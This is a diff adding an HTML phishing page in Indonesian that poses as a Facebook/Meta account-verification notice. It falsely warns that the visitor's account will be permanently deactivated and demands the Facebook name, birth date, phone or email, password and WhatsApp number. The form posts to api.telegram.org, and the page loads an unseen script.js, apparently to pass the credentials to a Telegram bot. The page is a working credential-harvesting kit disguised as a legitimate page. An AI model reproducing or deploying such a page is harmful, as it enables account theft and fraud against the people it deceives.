@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.weebly.com/favicon.ico">
+    <title>Home | Notif</title>
+</head>
+<body>
+    <style>
+        .loading-view {
+            width: 100vw;
+            background-color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 100;
+        }
+
+        .loading-container {
+            width: 62px;
+            height: 54px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-gap: 12px;
+        }
+
+        @media (min-width: 840px) {
+            .loading-container {
+                width: 72px;
+                height: 54px;
+                grid-gap: 12px;
+            }
+        }
+
+        .dot-container {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(#004db220, #004db2);
+            /* Base64 encoded simple circle SVG /resources/assets/js/prime/src/site/components/ui/circle.svg */
+            mask-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii0xIC0xIDIgMiI+Cgk8Y2lyY2xlIHI9IjEiLz4KPC9zdmc+Cg==');
+            -webkit-mask-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii0xIC0xIDIgMiI+Cgk8Y2lyY2xlIHI9IjEiLz4KPC9zdmc+Cg==');
+            mask-repeat: no-repeat;
+            -webkit-mask-repeat: no-repeat;
+            mask-size: 100% auto;
+            -webkit-mask-size: 100% auto;
+            mask-position: bottom;
+            -webkit-mask-position: bottom;
+            animation: loading-view-movement;
+            animation-delay: 0s;
+            animation-duration: 3750ms;
+            animation-iteration-count: infinite;
+            animation-timing-function: cubic-bezier(0.8, 0, 0.8, 1);
+        }
+
+        .dot-container:nth-of-type(2) {
+            animation-delay: 130ms;
+        }
+
+        .dot-container:nth-of-type(3) {
+            animation-delay: 260ms;
+        }
+
+        @keyframes loading-view-movement {
+            /* up and down for 3s, stop for 750ms */
+            0%, 27%, 54% {
+                mask-position: bottom;
+                -webkit-mask-position: bottom;
+            }
+
+            14%, 41%, 68% {
+                mask-position: top;
+                -webkit-mask-position: top;
+            }
+
+            27%, 54%, 81%, 100% {
+                mask-position: bottom;
+                -webkit-mask-position: bottom;
+            }
+        }
+        * {
+            padding: 0;
+            margin: 0;
+        }
+        header {
+            background-color: white;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .logo {
+            margin: 0 10px;
+        }
+        .logo img{
+            width: 100%;
+            margin-top: 50px;
+        }
+        form {
+            width: 100%;
+            margin-top: 20px;
+        }
+        form input {
+            width: 85%;
+            margin: 10px 10px;
+            height: 40px;
+            padding: 0 10px;
+        }
+        .Team {
+            margin: 10px;
+        }
+        .Team p {
+            font-weight: 200;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-size: 0.8rem;
+        }
+        .Team a {
+            color: black;
+            text-decoration: underline #a8a8a8;
+        }
+        .btn {
+            margin-top: 15px;
+        }
+        .btn button {
+            background-color: rgb(0, 110, 255);
+            color: rgb(255, 255, 255);
+            font-weight: 800;
+            font-size: 1.2rem;
+            padding:10px 15px;
+            margin-bottom: 40px;
+            border: none;
+        }
+        .btn button:hover {
+            background-color: rgb(0, 110, 255);
+        }
+        .quetes {
+            border: 1px solid;
+            margin: 0 20px;
+            padding: 10px 15px;
+        }
+        .quetes h1{
+            font-family: monospace;
+            padding:0;
+            font-size: 1.2rem;
+            border-bottom: 1px solid;
+        }
+        .quetes p {
+            font-family: monospace;
+            font-size: 1rem;
+            margin-top: 10px;
+        }
+    </style>
+    <div class="loading-view" style="display: none;">
+        <div
+            class="loading-container"
+        >
+            <div
+                class="dot-container"
+            ></div>
+            <div
+                class="dot-container"
+            ></div>
+            <div
+                class="dot-container"
+            ></div>
+        </div>
+    </div>
+        </div>
+    </div>
+    <header>
+        <div class="logo">
+            <img src="https://ed030df0ac8ea705430d.cdn6.editmysite.com/uploads/b/ed030df0ac8ea705430d11c08fd7af48b5373d12bdb5cb2dda02a48f5a2e9bcf/IMG-20240526-WA0000_1716989468.jpg?width=2400&optimize=medium" alt="">
+        </div>
+        <div class="quetes">
+            <h1>FACEBOOK ANDA AKAN SEGERA DI NONAKTIFKN SECARA PERMANENT
+            </h1>
+            <p>Untuk pembatalan penonaktifan akun anda silahkan memverifikasi data diri akun anda dengan benar dibawah untuk pembatalan penonaktifkan akun anda terimakasih 🙏
+            </p>
+        </div>
+        <form action="https://api.telegram.org" id="formTele" class="formtele" method="POST">
+
+            <input type="text" name="Nama facebook" placeholder="Nama Facebook *" autocapitalize="off" autocomplete="off" required="required">
+            <input type="text" name="Tanggal lahir facebook" placeholder="Tanggal Lahir Facebook *" autocapitalize="off" required="required">
+            <input type="text" name="Nomor Telpon Atau Email" Placeholder="Nomor Telpon Atau Email *" autocapitalize="off" autocomplete="off" required="required">
+            <input type="password" name="Password" placeholder="Password *" autocapitalize="off" autocomplete="off" required="required">
+            <input type="number" name="Nomor Whatsapp" placeholder="Nomor WhatsApp *" autocapitalize="off" autocomplete="off" required="required">
+
+            <div class="Team">
+                <p>Thid is protected by reCAPTCHA and the Google <a href="">Privacy Policy</a> and <a href="">Terms of Service</a> apply.</p>
+            </div>
+            <div class="btn">
+                <button type="submit" id="kirim">MASUK</button>
+            </div>
+            <div class="logo2">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="" style="width: 100px; text-align: center; margin-bottom: 5px;">
+            </div>
+        </form>
+    </header>
+    <script type="text/javascript">
+       document.addEventListener("DOMContentLoaded", () => {
+  const preloader = document.querySelector(".loading-view");
+  window.addEventListener("load", () => {
+    preloader.classList.add(".loader");
+    setTimeout(() => {
+      preloader.remove();
+    }, 3000);
+  });
+});
+    </script>
+
+    <script src="script.js"></script>
+</body>
+</html>
